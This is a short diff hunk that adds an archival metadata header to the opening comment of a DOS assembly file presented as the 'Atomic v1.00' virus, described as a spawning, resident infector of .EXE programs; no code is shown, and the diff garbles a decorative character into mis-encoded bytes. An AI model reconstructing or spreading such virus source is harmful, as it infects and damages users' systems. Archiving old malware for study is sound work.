@@ -1,6 +1,17 @@
+; ------------------------------------------------------------
+; name      A
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 comment $
 
-			     è  Atomic v1.00  è
+			     ï¿½  Atomic v1.00  ï¿½
 
 	     This virus is a spawning, resident infector of .EXE
 	     programs. Upon execution, Atomic will stay resident 
